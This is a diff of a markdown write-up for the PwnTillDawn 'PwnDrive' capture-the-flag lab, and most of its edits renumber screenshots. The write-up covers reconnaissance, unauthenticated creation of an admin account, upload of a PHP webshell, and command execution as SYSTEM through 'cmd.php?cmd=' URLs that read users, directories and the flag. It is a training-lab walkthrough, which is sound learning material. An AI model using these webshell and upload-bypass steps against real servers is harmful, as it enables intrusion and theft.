@@ -17,7 +17,6 @@
 - [Initial Access — File Upload Bypass](#-initial-access--file-upload-bypass)
 - [Remote Code Execution (Webshell)](#-remote-code-execution-webshell)
 - [Post-Exploitation](#-post-exploitation)
-- [Privilege Escalation](#-privilege-escalation)
 - [Flag](#-flag)
 
 ---
@@ -74,26 +73,26 @@ Auth Plugin: mysql_native_password
 
 ### Screenshot — Nmap HTTP Info (Port 80)
 
-![nmap-http](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/bbe15298cb65865adb3f9933a46cdd1c5c56cf50/pwntilldawn%201.png)
+![nmap-http](pwntilldawn_1.png)
 
 > Apache/2.4.46 (Win64), PHP/7.4.9, HTTP methods: GET HEAD POST OPTIONS  
 > Cookie `PHPSESSID` has `httponly` flag NOT set.
 
 ### Screenshot — MSSQL (Port 1433)
 
-![nmap-mssql](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/bbe15298cb65865adb3f9933a46cdd1c5c56cf50/pwntilldawn%202.png)
+![nmap-mssql](pwntilldawn_2.png)
 
 > Microsoft SQL Server 2012 RTM, Service Pack Level: RTM, no post-SP patches applied.
 
 ### Screenshot — MariaDB (Port 3306)
 
-![nmap-mariadb](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/bbe15298cb65865adb3f9933a46cdd1c5c56cf50/pwntilldawn%203.png)
+![nmap-mariadb](pwntilldawn_3.png)
 
 > MariaDB 5.5.5-10.4.14, SSL cert issued by `PwnDrive`.
 
 ### Screenshot — Higher RPC Ports
 
-![nmap-rpc](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/bbe15298cb65865adb3f9933a46cdd1c5c56cf50/pwntilldawn%204.png)
+![nmap-rpc](pwntilldawn_4.png)
 
 > Ports 49152–49157 running Microsoft Windows RPC.
 
@@ -107,7 +106,7 @@ gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt
 
 ### Screenshot — Gobuster Results
 
-![gobuster](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/bbe15298cb65865adb3f9933a46cdd1c5c56cf50/pwntilldawn%205.png)
+![gobuster](pwntilldawn_5.png)
 
 **Notable Directories Found:**
 
@@ -131,7 +130,7 @@ Navigating to `http://10.150.150.11/admin/` revealed an open directory listing:
 
 ### Screenshot — `/admin/` Index
 
-![admin-index](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/bbe15298cb65865adb3f9933a46cdd1c5c56cf50/pwntilldawn%207.png)
+![admin-index](pwntilldawn_7.png)
 
 ```
 /admin/addedituser.php   2020-11-16  3.4K
@@ -143,24 +142,13 @@ Navigating to `http://10.150.150.11/admin/` revealed an open directory listing:
 
 ---
 
-## 👤 User Enumeration — Admin Panel
+## 👤 User Creation — Admin Panel
 
-Visiting `/admin/manageusers.php` (after gaining admin access via `testuser`):
-
-### Screenshot — Manage Users
-
-![manage-users](pwntilldawn_10.png)
-
-| Username | Role |
-|----------|------|
-| admin | admin |
-| Chris | user |
-| Linda | user |
-| testuser | admin |
+Visiting `/admin/addedituser.php` allows creating a new admin user with no prior authentication:
 
 ### Screenshot — Create User Form (`addedituser.php`)
 
-![create-user](pwntilldawn_11.png)
+![create-user](pwntilldawn_8.png)
 
 > Created a new user `testuser` with role `admin` via `/admin/addedituser.php`.
 
@@ -180,15 +168,13 @@ After logging in as `testuser` (admin role), the application allows file uploads
 
 ### Screenshot — Successful Upload
 
-![file-uploaded](pwntilldawn_9.png)
+![file-uploaded](pwntilldawn_10.png)
 
 > `File Uploaded Successfully!` — `cmd.php` is now listed in personal files.
 
-### Screenshot — Upload Directory Listing
+### Screenshot — Upload Directory (`/upload/`)
 
-Navigating to `http://10.150.150.11/upload/` confirms uploaded files are accessible:
-
-![upload-index](pwntilldawn_13.png)
+![upload-index](pwntilldawn_6.png)
 
 ```
 /upload/2/    2026-04-22 01:16
@@ -197,7 +183,9 @@ Navigating to `http://10.150.150.11/upload/` confirms uploaded files are accessi
 
 The webshell lands in a numbered user folder, e.g., `/upload/11/cmd.php`:
 
-![upload-11](pwntilldawn_8.png)
+### Screenshot — `/upload/11/` Index
+
+![upload-11](pwntilldawn_11.png)
 
 ```
 /upload/11/cmd.php   2024-03-21 06:24   31 bytes
@@ -224,7 +212,7 @@ http://10.150.150.11/upload/11/cmd.php?cmd=whoami
 
 #### Screenshot
 
-![whoami](pwntilldawn_7.png)
+![whoami](pwntilldawn_12.png)
 
 ```
 nt authority\system
@@ -242,7 +230,7 @@ http://10.150.150.11/upload/11/cmd.php?cmd=hostname
 
 #### Screenshot
 
-![hostname](pwntilldawn_6.png)
+![hostname](pwntilldawn_13.png)
 
 ```
 PwnDrive
@@ -258,7 +246,7 @@ http://10.150.150.11/upload/11/cmd.php?cmd=net+user
 
 #### Screenshot
 
-![net-user](pwntilldawn_5.png)
+![net-user](pwntilldawn_14.png)
 
 ```
 User accounts for \\
@@ -276,16 +264,16 @@ http://10.150.150.11/upload/11/cmd.php?cmd=dir+C:\Users
 
 #### Screenshot
 
-![dir-users](pwntilldawn_4.png)
+![dir-users](pwntilldawn_15.png)
 
 ```
 Directory of C:\Users
 
-Administrator   06/27/2016 02:05 AM
-Classic .NET AppPool   03/28/2020 09:01 AM
-Jboden   06/27/2016 01:58 AM
-MSSQL$SQLEXPRESS   07/13/2009 09:57 PM
-Public   07/16/2020 06:44 AM
+Administrator        06/27/2016 02:05 AM
+Classic .NET AppPool 03/28/2020 09:01 AM
+Jboden               06/27/2016 01:58 AM
+MSSQL$SQLEXPRESS     07/13/2009 09:57 PM
+Public               07/16/2020 06:44 AM
 tony
 ```
 
@@ -299,19 +287,19 @@ http://10.150.150.11/upload/11/cmd.php?cmd=dir+C:\Users\Administrator
 
 #### Screenshot
 
-![dir-admin](pwntilldawn_3.png)
+![dir-admin](pwntilldawn_16.png)
 
 ```
-Contacts   11/17/2020 07:19 AM
-Desktop    06/27/2016 12:21 AM
-Documents  08/24/2020 05:59 AM
-Downloads  06/27/2016 12:21 AM
-Favorites  06/27/2016 12:21 AM
-Links      06/27/2016 12:21 AM
-Music      06/27/2016 12:21 AM
-Pictures   06/27/2016 12:21 AM
+Contacts    11/17/2020 07:19 AM
+Desktop     06/27/2016 12:21 AM
+Documents   08/24/2020 05:59 AM
+Downloads   06/27/2016 12:21 AM
+Favorites   06/27/2016 12:21 AM
+Links       06/27/2016 12:21 AM
+Music       06/27/2016 12:21 AM
+Pictures    06/27/2016 12:21 AM
 Saved Games 06/27/2016 12:21 AM
-Searches   06/27/2016 12:21 AM
+Searches    06/27/2016 12:21 AM
 Videos
 ```
 
@@ -325,7 +313,7 @@ http://10.150.150.11/upload/11/cmd.php?cmd=dir+C:\Users\Administrator\Desktop
 
 #### Screenshot
 
-![dir-desktop](pwntilldawn_2.png)
+![dir-desktop](pwntilldawn_17.png)
 
 ```
 11/17/2020  07:19 AM    .
@@ -349,7 +337,7 @@ http://10.150.150.11/upload/11/cmd.php?cmd=type+C:\Users\Administrator\Desktop\F
 
 ### Screenshot — Flag
 
-![flag](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/bbe15298cb65865adb3f9933a46cdd1c5c56cf50/pwntilldawn%2018.png)
+![flag](pwntilldawn_18.png)
 
 ```
 PwnTillDawnAcademyIsAwesome!!!
